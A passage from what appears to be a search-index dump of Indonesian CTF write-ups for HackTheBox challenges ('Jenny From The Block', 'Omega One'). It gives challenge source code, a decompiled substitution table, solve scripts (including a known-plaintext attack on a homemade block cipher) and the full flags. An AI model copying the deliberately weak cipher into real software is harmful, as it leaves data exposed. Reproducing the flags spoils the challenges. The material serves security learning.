ROUNDTHETRAJECT CGISVULNERABLEW TOHAPPENTHISSER NATIONOFYOURKIN # TERTHEDELIVERYS ORYOFTHEPLANETA ENEEDTOCHANGEIT IOUSMISSIONPOPO DAFINALWARNINGM # HTB{THELCGISVULNERABLEWENEEDTOCHANGEIT} flag HTB{THELCGISVULNERABLEWENEEDTOCHANGEIT}","title":"How The Columns Have Turned"},{"location":"ctf/writeup/comp/ca_jftb/","text":"Jenny From The Block \u00b6 chall.py from hashlib import sha256 from Crypto.Util.Padding import pad , unpad import signal import subprocess import socketserver import os allowed_commands = [ b 'whoami' , b 'ls' , b 'cat secret.txt' , b 'pwd' ] BLOCK_SIZE = 32 def encrypt_block ( block , secret ): enc_block = b '' for i in range ( BLOCK_SIZE ): val = ( block [ i ] + secret [ i ]) % 256 enc_block += bytes ([ val ]) return enc_block def encrypt ( msg , password ): h = sha256 ( password ) . digest () if len ( msg ) % BLOCK_SIZE != 0 : msg = pad ( msg , BLOCK_SIZE ) blocks = [ msg [ i : i + BLOCK_SIZE ] for i in range ( 0 , len ( msg ), BLOCK_SIZE )] ct = b '' for block in blocks : enc_block = encrypt_block ( block , h ) h = sha256 ( enc_block + block ) . digest () ct += enc_block return ct . hex () def run_command ( cmd ): if cmd in allowed_commands : try : resp = subprocess . run ( cmd . decode () . split ( ' ' ), capture_output = True ) output = resp . stdout return output except : return b 'Something went wrong! \\n ' else : return b 'Invalid command! \\n ' def challenge ( req ): req . sendall ( b 'This is Jenny! I am the heart and soul of this spaceship. \\n ' + b 'Welcome to the debug terminal. For security purposes I will encrypt any responses.' ) while True : req . sendall ( b ' \\n > ' ) command = req . recv ( 4096 ) . strip () output = run_command ( command ) response = b 'Command executed: ' + command + b ' \\n ' + output password = os . urandom ( 32 ) ct = encrypt ( response , password ) req . sendall ( ct . encode ()) class incoming ( socketserver . BaseRequestHandler ): def handle ( self ): signal . alarm ( 30 ) req = self . request challenge ( req ) class ReusableTCPServer ( socketserver . ForkingMixIn , socketserver . TCPServer ): pass def main (): socketserver . TCPServer . allow_reuse_address = True server = ReusableTCPServer (( \"0.0.0.0\" , 1337 ), incoming ) server . serve_forever () if __name__ == \"__main__\" : main () flag.py from Crypto.Util.Padding import pad , unpad from hashlib import sha256 BLOCK_SIZE = 32 def decrypt ( enc_block , secret ): dec_block = b '' for i in range ( BLOCK_SIZE ): val = ( enc_block [ i ] - secret [ i ]) % 256 dec_block += bytes ([ val ]) return dec_block # setelah percobaan, diketahui blocks[0] pas dengan= Command executed: cat secret.txt output_cat_secret = 'a2a78c0b6964d8d4ce5d2cab44662a167a8be2dd3ba043ef1d75d63d3e1a06a5d7e3b61d118c2bee845a89c264f00e93d77d2bb3ed07f864a7e6c02489f4cff37bc62ef8be58dc12a083e51def424eea3d7f0599ef305e25b6dce2e51504a33df2eb3cbdd1785ebc7e6ee5cfd014d5285035bfa685d088233f96c27a1a53dbf24e3fbe64e82d1ac7e5aff88eb9abdca2e9981e5aab3a9de8e22001e425b9fdd8d1b468482fed1b3221395575eee91f757e69a2049697fd585a19034df03c348ab28fbc76260c51dfea9482fe3b967131ebd7c80f45aa72bb2663ea0523962a74b8ab3378f3d4bc30f65a74971bdd07c4d337fba947e21007c9ef5fceb8f38d09' # nilai output bebas, sama saja enc = bytes . fromhex ( output_cat_secret ) enc_blocks = [ enc [ i : i + BLOCK_SIZE ] for i in range ( 0 , len ( enc ), BLOCK_SIZE )] block = b 'Command executed: cat secret.txt' pt = b '' for i in range ( len ( enc_blocks ) - 1 ): h = sha256 ( enc_blocks [ i ] + block ) . digest () p = decrypt ( enc_blocks [ i + 1 ], h ) block = p pt += p print ( pt ) flag HTB{b451c_b10ck_c1ph3r_15_w34k!!!}","title":"Jenny From The Block"},{"location":"ctf/writeup/comp/ca_jftb/#jenny-from-the-block","text":"chall.py from hashlib import sha256 from Crypto.Util.Padding import pad , unpad import signal import subprocess import socketserver import os allowed_commands = [ b 'whoami' , b 'ls' , b 'cat secret.txt' , b 'pwd' ] BLOCK_SIZE = 32 def encrypt_block ( block , secret ): enc_block = b '' for i in range ( BLOCK_SIZE ): val = ( block [ i ] + secret [ i ]) % 256 enc_block += bytes ([ val ]) return enc_block def encrypt ( msg , password ): h = sha256 ( password ) . digest () if len ( msg ) % BLOCK_SIZE != 0 : msg = pad ( msg , BLOCK_SIZE ) blocks = [ msg [ i : i + BLOCK_SIZE ] for i in range ( 0 , len ( msg ), BLOCK_SIZE )] ct = b '' for block in blocks : enc_block = encrypt_block ( block , h ) h = sha256 ( enc_block + block ) . digest () ct += enc_block return ct . hex () def run_command ( cmd ): if cmd in allowed_commands : try : resp = subprocess . run ( cmd . decode () . split ( ' ' ), capture_output = True ) output = resp . stdout return output except : return b 'Something went wrong! \\n ' else : return b 'Invalid command! \\n ' def challenge ( req ): req . sendall ( b 'This is Jenny! I am the heart and soul of this spaceship. \\n ' + b 'Welcome to the debug terminal. For security purposes I will encrypt any responses.' ) while True : req . sendall ( b ' \\n > ' ) command = req . recv ( 4096 ) . strip () output = run_command ( command ) response = b 'Command executed: ' + command + b ' \\n ' + output password = os . urandom ( 32 ) ct = encrypt ( response , password ) req . sendall ( ct . encode ()) class incoming ( socketserver . BaseRequestHandler ): def handle ( self ): signal . alarm ( 30 ) req = self . request challenge ( req ) class ReusableTCPServer ( socketserver . ForkingMixIn , socketserver . TCPServer ): pass def main (): socketserver . TCPServer . allow_reuse_address = True server = ReusableTCPServer (( \"0.0.0.0\" , 1337 ), incoming ) server . serve_forever () if __name__ == \"__main__\" : main () flag.py from Crypto.Util.Padding import pad , unpad from hashlib import sha256 BLOCK_SIZE = 32 def decrypt ( enc_block , secret ): dec_block = b '' for i in range ( BLOCK_SIZE ): val = ( enc_block [ i ] - secret [ i ]) % 256 dec_block += bytes ([ val ]) return dec_block # setelah percobaan, diketahui blocks[0] pas dengan= Command executed: cat secret.txt output_cat_secret = 'a2a78c0b6964d8d4ce5d2cab44662a167a8be2dd3ba043ef1d75d63d3e1a06a5d7e3b61d118c2bee845a89c264f00e93d77d2bb3ed07f864a7e6c02489f4cff37bc62ef8be58dc12a083e51def424eea3d7f0599ef305e25b6dce2e51504a33df2eb3cbdd1785ebc7e6ee5cfd014d5285035bfa685d088233f96c27a1a53dbf24e3fbe64e82d1ac7e5aff88eb9abdca2e9981e5aab3a9de8e22001e425b9fdd8d1b468482fed1b3221395575eee91f757e69a2049697fd585a19034df03c348ab28fbc76260c51dfea9482fe3b967131ebd7c80f45aa72bb2663ea0523962a74b8ab3378f3d4bc30f65a74971bdd07c4d337fba947e21007c9ef5fceb8f38d09' # nilai output bebas, sama saja enc = bytes . fromhex ( output_cat_secret ) enc_blocks = [ enc [ i : i + BLOCK_SIZE ] for i in range ( 0 , len ( enc ), BLOCK_SIZE )] block = b 'Command executed: cat secret.txt' pt = b '' for i in range ( len ( enc_blocks ) - 1 ): h = sha256 ( enc_blocks [ i ] + block ) . digest () p = decrypt ( enc_blocks [ i + 1 ], h ) block = p pt += p print ( pt ) flag HTB{b451c_b10ck_c1ph3r_15_w34k!!!}","title":"Jenny From The Block"},{"location":"ctf/writeup/comp/ca_oo/","text":"Omega One \u00b6 omega-one output.txt $ file omega-one omega-one: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=002fdb38356a09bdeee2cf4b9ce0b41b4b8c53d9, stripped Crerceon Ezains Ummuh Zonnu Vinzo Cuzads Emoi Ohols Groz'ens Ukox Ehnu Pheilons Cuzads Khehlan Ohols Ehnu Munis Inphas Pheilons Ehnu Dut Ukox Ohols Pheilons Pheilons Zimil Ehnu Honzor Vinzo Ukteils Falnain Dhohmu Baadix Menggunakan tools IDA untuk disassembly fungsi main, diperoleh list __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { qword_203018 = sub_1673 ( 4L L , a2 , a3 ); sub_2120 ( sub_AEA ); sub_1870 ( qword_203018 , \"k\" , \"Lendrens\" ); sub_1870 ( qword_203018 , \"d\" , \"Thauv'i\" ); sub_1870 ( qword_203018 , \"P\" , \"Throrqiek\" ); sub_1870 ( qword_203018 , \"e\" , \"Inqods\" ); sub_1870 ( qword_203018 , \"6\" , \"Tarquts\" ); sub_1870 ( qword_203018 , \"p\" , \"Dut\" ); sub_1870 ( qword_203018 , \"A\" , \"Krolkel\" ); sub_1870 ( qword_203018 , \"n\" , \"Emoi\" ); sub_1870 ( qword_203018 , \"|\" , \"Dakroith\" ); sub_1870 ( qword_203018 , \"*\" , \"Creiqex\" ); sub_1870 ( qword_203018 , \"Y\" , \"Thomois\" ); sub_1870 ( qword_203018 , \"4\" , \"Groz'ens\" ); sub_1870 ( qword_203018 , \"D\" , \"Urqek\" ); sub_1870 ( qword_203018 , \"v\" , \"Nid\" ); sub_1870 ( qword_203018 , \"H\" , \"Crerceon\" ); sub_1870 ( qword_203018 , \"#\" , \"Yonphie\" ); sub_1870 ( qword_203018 , \"S\" , \"Xits\" ); sub_1870 ( qword_203018 , \"I\" , \"Thohul\" ); sub_1870 ( qword_203018 , \"W\" , \"Zahrull\" ); sub_1870 ( qword_203018 , \"i\" , \"Om'ons\" ); sub_1870 ( qword_203018 , \"F\" , \"Kradraks\" ); sub_1870 ( qword_203018 , \"+\" , \"Ielkul\" ); sub_1870 ( qword_203018 , \"q\" , \"Vranix\" ); sub_1870 ( qword_203018 , \"M\" , \"Trun\" ); sub_1870 ( qword_203018 , \"h\" , \"Craz'ails\" ); sub_1870 ( qword_203018 , \".\" , \"Xoq'an\" ); sub_1870 ( qword_203018 , \"r\" , \"Ukox\" ); sub_1870 ( qword_203018 , \"N\" , \"Evods\" ); sub_1870 ( qword_203018 , \";\" , \"Taxan\" ); sub_1870 ( qword_203018 , \"b\" , \"Munis\" ); sub_1870 ( qword_203018 , \"g\" , \"Trurkror\" ); sub_1870 ( qword_203018 , \"?\" , \"Tulphaer\" ); sub_1870 ( qword_203018 , \"_\" , \"Ehnu\" ); sub_1870 ( qword_203018 , \"$\" , \"Krets\" ); sub_1870 ( qword_203018 , \",\" , \"Grons\" ); sub_1870 ( qword_203018 , \")\" , \"Ingell\" ); sub_1870 ( qword_203018 , \"(\" , \"Ecruns\" ); sub_1870 ( qword_203018 , \"m\" , \"Khehlan\" ); sub_1870 ( qword_203018 , \"R\" , \"Velzaeth\" ); sub_1870 ( qword_203018 , \"Q\" , \"Cuhix\" ); sub_1870 ( qword_203018 , \"l\" , \"Vinzo\" ); sub_1870 ( qword_203018 , \"E\" , \"Istrur\" ); sub_1870 ( qword_203018 , \">\" , \"Zuvas\" ); sub_1870 ( qword_203018 , \"s\" , \"Honzor\" ); sub_1870 ( qword_203018 , \"0\" , \"Ukteils\" ); sub_1870 ( qword_203018 , \"}\" , \"Baadix\" ); sub_1870 ( qword_203018 , \"{\" , \"Zonnu\" ); sub_1870 ( qword_203018 , \" \\\\ \" , \"Aarcets\" ); sub_1870 ( qword_203018 , \"[\" , \"Nevell\" ); sub_1870 ( qword_203018 , \"!\" , \"Dhohmu\" ); sub_1870 ( qword_203018 , \"X\" , \"Xan\" ); sub_1870 ( qword_203018 , \"O\" , \"Zissat\" ); sub_1870 ( qword_203018 , \"x\" , \"Iscax\" ); sub_1870 ( qword_203018 , \"t\" , \"Pheilons\" ); sub_1870 ( qword_203018 , \"`\" , \"Ghiso\" ); sub_1870 ( qword_203018 , \"-\" , \"Scrigvil\" ); sub_1870 ( qword_203018 , \"B\" , \"Ummuh\" ); sub_1870 ( qword_203018 , \"u\" , \"Inphas\" ); sub_1870 ( qword_203018 , \"/\" , \"Vurqails\" ); sub_1870 ( qword_203018 , \"a\" , \"Vruziels\" ); sub_1870 ( qword_203018 , \":\" , \"Ghut'ox\" ); sub_1870 ( qword_203018 , \"^\" , \"Aahroill\" ); sub_1870 ( qword_203018 , \"L\" , \"Gairqeik\" ); sub_1870 ( qword_203018 , \"U\" , \"Qeks\" ); sub_1870 ( qword_203018 , \"'\" , \"Scuvvils\" ); sub_1870 ( qword_203018 , \"3\" , \"Ohols\" ); sub_1870 ( qword_203018 , \"5\" , \"Som'ir\" ); sub_1870 ( qword_203018 , \"C\" , \"Onzear\" ); sub_1870 ( qword_203018 , \"2\" , \"Dhaesux\" ); sub_1870 ( qword_203018 , \"w\" , \"Falnain\" ); sub_1870 ( qword_203018 , \" \" , \"Draalpho\" ); sub_1870 ( qword_203018 , \"G\" , \"Yemor\" ); sub_1870 ( qword_203018 , \"c\" , \"Thraurgok\" ); sub_1870 ( qword_203018 , \" \\\" \" , \"Vogeath\" ); sub_1870 ( qword_203018 , \"1\" , \"Cuzads\" ); sub_1870 ( qword_203018 , \"Z\" , \"Gagro\" ); sub_1870 ( qword_203018 , \"=\" , \"Zad\" ); sub_1870 ( qword_203018 , \"f\" , \"Dhieqe\" ); sub_1870 ( qword_203018 , \"&\" , \"Xustrek\" ); sub_1870 ( qword_203018 , \"o\" , \"Harned\" ); sub_1870 ( qword_203018 , \"V\" , \"Dhulgea\" ); sub_1870 ( qword_203018 , \"y\" , \"Zimil\" ); sub_1870 ( qword_203018 , \"z\" , \"Thretex\" ); sub_1870 ( qword_203018 , \"8\" , \"Bravon\" ); sub_1870 ( qword_203018 , \"%\" , \"Krugreall\" ); sub_1870 ( qword_203018 , \"J\" , \"Vaendred\" ); sub_1870 ( qword_203018 , \"@\" , \"Osux\" ); sub_1870 ( qword_203018 , \"T\" , \"Ezains\" ); sub_1870 ( qword_203018 , \"K\" , \"Mik'ed\" ); sub_1870 ( qword_203018 , \"<\" , \"Cruz'oll\" ); sub_1870 ( qword_203018 , \"]\" , \"Dhognot\" ); sub_1870 ( qword_203018 , \"7\" , \"Drids\" ); sub_1870 ( qword_203018 , \"9\" , \"Drercieks\" ); sub_1870 ( qword_203018 , \"j\" , \"Statars\" ); return 0L L ; } flag.py app = { \"Lendrens\" : \"k\" , \"Thauv'i\" : \"d\" , \"Throrqiek\" : \"P\" , \"Inqods\" : \"e\" , \"Tarquts\" : \"6\" , \"Dut\" : \"p\" , \"Krolkel\" : \"A\" , \"Emoi\" : \"n\" , \"Dakroith\" : \"|\" , \"Creiqex\" : \"*\" , \"Thomois\" : \"Y\" , \"Groz'ens\" : \"4\" , \"Urqek\" : \"D\" , \"Nid\" : \"v\" , \"Crerceon\" : \"H\" , \"Yonphie\" : \"#\" , \"Xits\" : \"S\" , \"Thohul\" : \"I\" , \"Zahrull\" : \"W\" , \"Om'ons\" : \"i\" , \"Kradraks\" : \"F\" , \"Ielkul\" : \"+\" , \"Vranix\" : \"q\" , \"Trun\" : \"M\" , \"Craz'ails\" : \"h\" , \"Xoq'an\" : \".\" , \"Ukox\" : \"r\" , \"Evods\" : \"N\" , \"Taxan\" : \";\" , \"Munis\" : \"b\" , \"Trurkror\" : \"g\" , \"Tulphaer\" : \"?\" , \"Ehnu\" : \"_\" , \"Krets\" : \"$\" , \"Grons\" : \",\" , \"Ingell\" : \")\" , \"Ecruns\" : \"(\" , \"Khehlan\" : \"m\" , \"Velzaeth\" : \"R\" , \"Cuhix\" : \"Q\" , \"Vinzo\" : \"l\" , \"Istrur\" : \"E\" , \"Zuvas\" : \">\" , \"Honzor\" : \"s\" , \"Ukteils\" : \"0\" , \"Baadix\" : \"}\" , \"Zonnu\" : \"{\" , \"Aarcets\" : \" \\\\ \" , \"Nevell\" : \"[\" , \"Dhohmu\" : \"!\" , \"Xan\" : \"X\" , \"Zissat\" : \"O\" , \"Iscax\" : \"x\" , \"Pheilons\" : \"t\" , \"Ghiso\" : \"`\" , \"Scrigvil\" : \"-\" , \"Ummuh\" : \"B\" , \"Inphas\" : \"u\" , \"Vurqails\" : \"/\" , \"Vruziels\" : \"a\" , \"Ghut'ox\" : \":\" , \"Aahroill\" : \"^\" , \"Gairqeik\" : \"L\" , \"Qeks\" : \"U\" , \"Scuvvils\" : \"'\" , \"Ohols\" : \"3\" , \"Som'ir\" : \"5\" , \"Onzear\" : \"C\" , \"Dhaesux\" : \"2\" , \"Falnain\" : \"w\" , \"Draalpho\" : \" \" , \"Yemor\" : \"G\" , \"Thraurgok\" : \"c\" , \"Vogeath\" : \" \\\" \" , \"Cuzads\" : \"1\" , \"Gagro\" : \"Z\" , \"Zad\" : \"=\" , \"Dhieqe\" : \"f\" , \"Xustrek\" : \"&\" , \"Harned\" : \"o\" , \"Dhulgea\" : \"V\" , \"Zimil\" : \"y\" , \"Thretex\" : \"z\" , \"Bravon\" : \"8\" , \"Krugreall\" : \"%\" , \"Vaendred\" : \"J\" , \"Osux\" : \"@\" , \"Ezains\" : \"T\" , \"Mik'ed\" : \"K\" , \"Cruz'oll\" : \"<\" , \"Dhognot\" : \"]\" , \"Drids\" : \"7\" , \"Drercieks\" : \"9\" , \"Statars\" : \"j\" , } print ( app [ \"Crerceon\" ], end = '' ) print ( app [ \"Ezains\" ], end = '' ) print ( app [ \"Ummuh\" ], end = '' ) print ( app [ \"Zonnu\" ], end = '' ) print ( app [ \"Vinzo\" ], end = '' ) print ( app [ \"Cuzads\" ], end = '' ) print ( app [ \"Emoi\" ], end = '' ) print ( app [ \"Ohols\" ], end = '' ) print ( app [ \"Groz'ens\" ], end = '' ) print ( app [ \"Ukox\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Cuzads\" ], end = '' ) print ( app [ \"Khehlan\" ], end = '' ) print ( app [ \"Ohols\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Munis\" ], end = '' ) print ( app [ \"Inphas\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Dut\" ], end = '' ) print ( app [ \"Ukox\" ], end = '' ) print ( app [ \"Ohols\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Zimil\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Honzor\" ], end = '' ) print ( app [ \"Vinzo\" ], end = '' ) print ( app [ \"Ukteils\" ], end = '' ) print ( app [ \"Falnain\" ], end = '' ) print ( app [ \"Dhohmu\" ], end = '' ) print ( app [ \"Baadix\" ], end = '' ) flag HTB{l1n34r_t1m3_but_pr3tty_sl0w!}","title":"Omega One"},{"location":"ctf/writeup/comp/ca_oo/#omega-one","text":"omega-one output.txt $ file omega-one omega-one: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=002fdb38356a09bdeee2cf4b9ce0b41b4b8c53d9, stripped Crerceon Ezains Ummuh Zonnu Vinzo Cuzads Emoi Ohols Groz'ens Ukox Ehnu Pheilons Cuzads Khehlan Ohols Ehnu Munis Inphas Pheilons Ehnu Dut Ukox Ohols Pheilons Pheilons Zimil Ehnu Honzor Vinzo Ukteils Falnain Dhohmu Baadix Menggunakan tools IDA untuk disassembly fungsi main, diperoleh list __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { qword_203018 = sub_1673 ( 4L L , a2 , a3 ); sub_2120 ( sub_AEA ); sub_1870 ( qword_203018 , \"k\" , \"Lendrens\" ); sub_1870 ( qword_203018 , \"d\" , \"Thauv'i\" ); sub_1870 ( qword_203018 , \"P\" , \"Throrqiek\" ); sub_1870 ( qword_203018 , \"e\" , \"Inqods\" ); sub_1870 ( qword_203018 , \"6\" , \"Tarquts\" ); sub_1870 ( qword_203018 , \"p\" , \"Dut\" ); sub_1870 ( qword_203018 , \"A\" , \"Krolkel\" ); sub_1870 ( qword_203018 , \"n\" , \"Emoi\" ); sub_1870 ( qword_203018 , \"|\" , \"Dakroith\" ); sub_1870 ( qword_203018 , \"*\" , \"Creiqex\" ); sub_1870 ( qword_203018 , \"Y\" , \"Thomois\" ); sub_1870 ( qword_203018 , \"4\" , \"Groz'ens\" ); sub_1870 ( qword_203018 , \"D\" , \"Urqek\" ); sub_1870 ( qword_203018 , \"v\" , \"Nid\" ); sub_1870 ( qword_203018 , \"H\" , \"Crerceon\" ); sub_1870 ( qword_203018 , \"#\" , \"Yonphie\" ); sub_1870 ( qword_203018 , \"S\" , \"Xits\" ); sub_1870 ( qword_203018 , \"I\" , \"Thohul\" ); sub_1870 ( qword_203018 , \"W\" , \"Zahrull\" ); sub_1870 ( qword_203018 , \"i\" , \"Om'ons\" ); sub_1870 ( qword_203018 , \"F\" , \"Kradraks\" ); sub_1870 ( qword_203018 , \"+\" , \"Ielkul\" ); sub_1870 ( qword_203018 , \"q\" , \"Vranix\" ); sub_1870 ( qword_203018 , \"M\" , \"Trun\" ); sub_1870 ( qword_203018 , \"h\" , \"Craz'ails\" ); sub_1870 ( qword_203018 , \".\" , \"Xoq'an\" ); sub_1870 ( qword_203018 , \"r\" , \"Ukox\" ); sub_1870 ( qword_203018 , \"N\" , \"Evods\" ); sub_1870 ( qword_203018 , \";\" , \"Taxan\" ); sub_1870 ( qword_203018 , \"b\" , \"Munis\" ); sub_1870 ( qword_203018 , \"g\" , \"Trurkror\" ); sub_1870 ( qword_203018 , \"?\" , \"Tulphaer\" ); sub_1870 ( qword_203018 , \"_\" , \"Ehnu\" ); sub_1870 ( qword_203018 , \"$\" , \"Krets\" ); sub_1870 ( qword_203018 , \",\" , \"Grons\" ); sub_1870 ( qword_203018 , \")\" , \"Ingell\" ); sub_1870 ( qword_203018 , \"(\" , \"Ecruns\" ); sub_1870 ( qword_203018 , \"m\" , \"Khehlan\" ); sub_1870 ( qword_203018 , \"R\" , \"Velzaeth\" ); sub_1870 ( qword_203018 , \"Q\" , \"Cuhix\" ); sub_1870 ( qword_203018 , \"l\" , \"Vinzo\" ); sub_1870 ( qword_203018 , \"E\" , \"Istrur\" ); sub_1870 ( qword_203018 , \">\" , \"Zuvas\" ); sub_1870 ( qword_203018 , \"s\" , \"Honzor\" ); sub_1870 ( qword_203018 , \"0\" , \"Ukteils\" ); sub_1870 ( qword_203018 , \"}\" , \"Baadix\" ); sub_1870 ( qword_203018 , \"{\" , \"Zonnu\" ); sub_1870 ( qword_203018 , \" \\\\ \" , \"Aarcets\" ); sub_1870 ( qword_203018 , \"[\" , \"Nevell\" ); sub_1870 ( qword_203018 , \"!\" , \"Dhohmu\" ); sub_1870 ( qword_203018 , \"X\" , \"Xan\" ); sub_1870 ( qword_203018 , \"O\" , \"Zissat\" ); sub_1870 ( qword_203018 , \"x\" , \"Iscax\" ); sub_1870 ( qword_203018 , \"t\" , \"Pheilons\" ); sub_1870 ( qword_203018 , \"`\" , \"Ghiso\" ); sub_1870 ( qword_203018 , \"-\" , \"Scrigvil\" ); sub_1870 ( qword_203018 , \"B\" , \"Ummuh\" ); sub_1870 ( qword_203018 , \"u\" , \"Inphas\" ); sub_1870 ( qword_203018 , \"/\" , \"Vurqails\" ); sub_1870 ( qword_203018 , \"a\" , \"Vruziels\" ); sub_1870 ( qword_203018 , \":\" , \"Ghut'ox\" ); sub_1870 ( qword_203018 , \"^\" , \"Aahroill\" ); sub_1870 ( qword_203018 , \"L\" , \"Gairqeik\" ); sub_1870 ( qword_203018 , \"U\" , \"Qeks\" ); sub_1870 ( qword_203018 , \"'\" , \"Scuvvils\" ); sub_1870 ( qword_203018 , \"3\" , \"Ohols\" ); sub_1870 ( qword_203018 , \"5\" , \"Som'ir\" ); sub_1870 ( qword_203018 , \"C\" , \"Onzear\" ); sub_1870 ( qword_203018 , \"2\" , \"Dhaesux\" ); sub_1870 ( qword_203018 , \"w\" , \"Falnain\" ); sub_1870 ( qword_203018 , \" \" , \"Draalpho\" ); sub_1870 ( qword_203018 , \"G\" , \"Yemor\" ); sub_1870 ( qword_203018 , \"c\" , \"Thraurgok\" ); sub_1870 ( qword_203018 , \" \\\" \" , \"Vogeath\" ); sub_1870 ( qword_203018 , \"1\" , \"Cuzads\" ); sub_1870 ( qword_203018 , \"Z\" , \"Gagro\" ); sub_1870 ( qword_203018 , \"=\" , \"Zad\" ); sub_1870 ( qword_203018 , \"f\" , \"Dhieqe\" ); sub_1870 ( qword_203018 , \"&\" , \"Xustrek\" ); sub_1870 ( qword_203018 , \"o\" , \"Harned\" ); sub_1870 ( qword_203018 , \"V\" , \"Dhulgea\" ); sub_1870 ( qword_203018 , \"y\" , \"Zimil\" ); sub_1870 ( qword_203018 , \"z\" , \"Thretex\" ); sub_1870 ( qword_203018 , \"8\" , \"Bravon\" ); sub_1870 ( qword_203018 , \"%\" , \"Krugreall\" ); sub_1870 ( qword_203018 , \"J\" , \"Vaendred\" ); sub_1870 ( qword_203018 , \"@\" , \"Osux\" ); sub_1870 ( qword_203018 , \"T\" , \"Ezains\" ); sub_1870 ( qword_203018 , \"K\" , \"Mik'ed\" ); sub_1870 ( qword_203018 , \"<\" , \"Cruz'oll\" ); sub_1870 ( qword_203018 , \"]\" , \"Dhognot\" ); sub_1870 ( qword_203018 , \"7\" , \"Drids\" ); sub_1870 ( qword_203018 , \"9\" , \"Drercieks\" ); sub_1870 ( qword_203018 , \"j\" , \"Statars\" ); return 0L L ; } flag.py app = { \"Lendrens\" : \"k\" , \"Thauv'i\" : \"d\" , \"Throrqiek\" : \"P\" , \"Inqods\" : \"e\" , \"Tarquts\" : \"6\" , \"Dut\" : \"p\" , \"Krolkel\" : \"A\" , \"Emoi\" : \"n\" , \"Dakroith\" : \"|\" , \"Creiqex\" : \"*\" , \"Thomois\" : \"Y\" , \"Groz'ens\" : \"4\" , \"Urqek\" : \"D\" , \"Nid\" : \"v\" , \"Crerceon\" : \"H\" , \"Yonphie\" : \"#\" , \"Xits\" : \"S\" , \"Thohul\" : \"I\" , \"Zahrull\" : \"W\" , \"Om'ons\" : \"i\" , \"Kradraks\" : \"F\" , \"Ielkul\" : \"+\" , \"Vranix\" : \"q\" , \"Trun\" : \"M\" , \"Craz'ails\" : \"h\" , \"Xoq'an\" : \".\" , \"Ukox\" : \"r\" , \"Evods\" : \"N\" , \"Taxan\" : \";\" , \"Munis\" : \"b\" , \"Trurkror\" : \"g\" , \"Tulphaer\" : \"?\" , \"Ehnu\" : \"_\" , \"Krets\" : \"$\" , \"Grons\" : \",\" , \"Ingell\" : \")\" , \"Ecruns\" : \"(\" , \"Khehlan\" : \"m\" , \"Velzaeth\" : \"R\" , \"Cuhix\" : \"Q\" , \"Vinzo\" : \"l\" , \"Istrur\" : \"E\" , \"Zuvas\" : \">\" , \"Honzor\" : \"s\" , \"Ukteils\" : \"0\" , \"Baadix\" : \"}\" , \"Zonnu\" : \"{\" , \"Aarcets\" : \" \\\\ \" , \"Nevell\" : \"[\" , \"Dhohmu\" : \"!\" , \"Xan\" : \"X\" , \"Zissat\" : \"O\" , \"Iscax\" : \"x\" , \"Pheilons\" : \"t\" , \"Ghiso\" : \"`\" , \"Scrigvil\" : \"-\" , \"Ummuh\" : \"B\" , \"Inphas\" : \"u\" , \"Vurqails\" : \"/\" , \"Vruziels\" : \"a\" , \"Ghut'ox\" : \":\" , \"Aahroill\" : \"^\" , \"Gairqeik\" : \"L\" , \"Qeks\" : \"U\" , \"Scuvvils\" : \"'\" , \"Ohols\" : \"3\" , \"Som'ir\" : \"5\" , \"Onzear\" : \"C\" , \"Dhaesux\" : \"2\" , \"Falnain\" : \"w\" , \"Draalpho\" : \" \" , \"Yemor\" : \"G\" , \"Thraurgok\" : \"c\" , \"Vogeath\" : \" \\\" \" , \"Cuzads\" : \"1\" , \"Gagro\" : \"Z\" , \"Zad\" : \"=\" , \"Dhieqe\" : \"f\" , \"Xustrek\" : \"&\" , \"Harned\" : \"o\" , \"Dhulgea\" : \"V\" , \"Zimil\" : \"y\" , \"Thretex\" : \"z\" , \"Bravon\" : \"8\" , \"Krugreall\" : \"%\" , \"Vaendred\" : \"J\" , \"Osux\" : \"@\" , \"Ezains\" : \"T\" , \"Mik'ed\" : \"K\" , \"Cruz'oll\" : \"<\" , \"Dhognot\" : \"]\" , \"Drids\" : \"7\" , \"Drercieks\" : \"9\" , \"Statars\" : \"j\" , } print ( app [ \"Crerceon\" ], end = '' ) print ( app [ \"Ezains\" ], end = '' ) print ( app [ \"Ummuh\" ], end = '' ) print ( app [ \"Zonnu\" ], end = '' ) print ( app [ \"Vinzo\" ], end = '' ) print ( app [ \"Cuzads\" ], end = '' ) print ( app [ \"Emoi\" ], end = '' ) print ( app [ \"Ohols\" ], end = '' ) print ( app [ \"Groz'ens\" ], end = '' ) print ( app [ \"Ukox\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Cuzads\" ], end = '' ) print ( app [ \"Khehlan\" ], end = '' ) print ( app [ \"Ohols\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Munis\" ], end = '' ) print ( app [ \"Inphas\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Dut\" ], end = '' ) print ( app [ \"Ukox\" ], end = '' ) print ( app [ \"Ohols\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Pheilons\" ], end = '' ) print ( app [ \"Zimil\" ], end = '' ) print ( app [ \"Ehnu\" ], end = '' ) print ( app [ \"Honzor\" ], end = '' ) print ( app [ \"Vinzo\" ], end = '' ) print ( app [ \"Ukteils\" ], end = '' ) print ( app [ \"Falnain\" ], end = '' ) print ( app [ \"Dhohmu\" ], end = '' ) print ( app [ \"Baadix\" ], end = '' ) flag HTB{l1n34r_t1m3_but_pr3tty_sl0w!}","title":"Omega One"},{"location":"ctf/writeup/comp/ca_r/","text":"Rebuilding \u00b6 